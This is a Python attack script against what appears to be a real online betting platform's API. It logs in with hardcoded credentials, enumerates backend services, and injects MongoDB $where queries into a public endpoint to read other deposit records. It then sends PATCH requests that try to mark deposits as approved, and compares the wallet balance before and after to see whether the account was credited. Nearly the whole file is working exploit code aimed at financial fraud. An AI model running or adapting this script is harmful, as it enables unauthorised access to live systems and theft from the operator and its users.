#!/usr/bin/env python3
"""probe_nosql_deposit.py — NoSQL injection to find/manipulate deposit records.

   Since /pb/latest-win allows $where injection, try to:
   1. Find deposit-related collections via NoSQL
   2. Find pending deposit records
   3. Try PATCH/PUT to change status to approved
"""
import base64, json, pathlib, requests, time

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"

# Auth
r = requests.post(f"{PBAPI}/pb/authentication",
    headers={"Content-Type": "application/json"},
    json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
    timeout=15)
JWT = r.json()["accessToken"]
print(f"JWT OK\n")

HDR = {"Authorization": f"Bearer {JWT}", "template": "vn", "Content-Type": "application/json"}
PB_HDR = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# ── 1. Find all accessible pbapi services ─────────────────────────────────────
print("=== 1. Enumerate pbapi services ===")
services_found = []
# Common FeathersJS service names
test_services = [
    "deposit-transactions", "deposits", "transactions", "wallets",
    "bank-accounts", "payment-accounts", "slip-deposits", "auto-deposits",
    "qr-deposits", "bank-transactions", "balance-transactions",
    "deposit-requests", "deposit-queue", "pending-deposits",
    "users", "latest-win", "latest-withdraw", "notifications",
    "deposit-confirm", "deposit-approve", "deposit-status",
]

for svc in test_services:
    r = requests.get(f"{PBAPI}/pb/{svc}",
                     headers=PB_HDR,
                     params={"domain": DOMAIN, "$limit": 1},
                     timeout=8)
    if r.status_code == 200:
        try:
            data = r.json()
            count = len(data.get("data", [])) if isinstance(data, dict) else len(data)
            services_found.append(svc)
            print(f"  [!!!] /pb/{svc}: 200 ({count} records)")
        except Exception:
            print(f"  [!!!] /pb/{svc}: 200 (non-JSON)")
    elif r.status_code != 404:
        print(f"  /pb/{svc}: {r.status_code}")

# ── 2. NoSQL injection on latest-win to find deposit data ─────────────────────
print("\n=== 2. NoSQL injection for deposit data ===")

# Try to find records with deposit-related fields
nosql_queries = [
    # Find records with deposit_amount
    "this.deposit_amount>0",
    # Find records with status pending/waiting
    "this.deposit_status=='pending'||this.deposit_status=='waiting'",
    # Find records with our player ID
    "this.player_id!=null&&this.deposit_amount!=null",
    # Find records with qr_string
    "this.qr_string!=null&&this.qr_string.length>10",
    # Find records with balance changes
    "this.balance_before!=null||this.balance_after!=null",
    # Find recent records (by _id structure - MongoDB ObjectId starts with timestamp)
    "this._id.toString().startsWith('67')",  # Oct 2026 ObjectIds start with ~67
]

for query in nosql_queries:
    r = requests.get(f"{PBAPI}/pb/latest-win",
                     headers=PB_HDR,
                     params={"domain": DOMAIN, "$where": query, "$limit": 5},
                     timeout=10)
    if r.ok:
        try:
            data = r.json()
            items = data if isinstance(data, list) else data.get("data", [])
            if items:
                print(f"\n  [{query[:45]}...] → {len(items)} records")
                for item in items[:2]:
                    # Print relevant fields
                    fields = {}
                    for key in ["id", "_id", "status", "deposit_status", "deposit_amount",
                                "balance_before", "balance_after", "qr_string", "player_id",
                                "amount", "type", "createdAt"]:
                        if key in item:
                            val = item[key]
                            if isinstance(val, str) and len(val) > 30:
                                val = val[:30] + "..."
                            fields[key] = val
                    if fields:
                        print(f"      {json.dumps(fields)}")
        except Exception as e:
            print(f"  [{query[:30]}...] parse error: {e}")

# ── 3. Try to access deposit services with NoSQL operators ────────────────────
print("\n=== 3. Try deposit services with NoSQL operators ===")

# If we found deposit services, try to access them with NoSQL
for svc in services_found:
    if "deposit" in svc.lower() or "transaction" in svc.lower():
        # Try GET with various filters
        for params in [
            {"status": "pending"},
            {"deposit_status": "waiting"},
            {"$where": "this.status=='pending'"},
            {"player_id": "eea830ab-b187-4f21-9b79-28e2773b2f6b"},  # our player ID
        ]:
            r = requests.get(f"{PBAPI}/pb/{svc}",
                             headers=PB_HDR,
                             params={**params, "domain": DOMAIN, "$limit": 5},
                             timeout=10)
            if r.ok:
                try:
                    items = r.json().get("data", []) if isinstance(r.json(), dict) else r.json()
                    if items:
                        print(f"  GET /pb/{svc} {list(params.keys())[0]}: {len(items)} records")
                        for item in items[:2]:
                            print(f"    {item.get('id','?')[:8]} | status={item.get('status','?')} "
                                  f"| amount={item.get('amount', item.get('deposit_amount','?'))}")
                except Exception:
                    pass

# ── 4. Try PATCH on any found deposit records ─────────────────────────────────
print("\n=== 4. Try PATCH on deposit records ===")

# Get the latest records from latest-win that might be deposits
r = requests.get(f"{PBAPI}/pb/latest-win",
                 headers=PB_HDR,
                 params={"domain": DOMAIN, "$where": "this._id!=null", "$limit": 10,
                         "$sort[createdAt]": -1},
                 timeout=10)
if r.ok:
    items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    for item in items[:5]:
        item_id = item.get("id") or item.get("_id")
        if item_id:
            # Try PATCH to change status
            for svc in ["latest-win", "deposits", "deposit-transactions", "transactions"]:
                pr = requests.patch(f"{PBAPI}/pb/{svc}/{item_id}",
                                    headers=PB_HDR,
                                    json={"status": "approved", "deposit_status": "approved"},
                                    timeout=10)
                if pr.status_code not in (404, 405):
                    print(f"  PATCH /pb/{svc}/{str(item_id)[:8]}: HTTP {pr.status_code}: {pr.text[:80]}")

# ── 5. Final wallet check ─────────────────────────────────────────────────────
time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
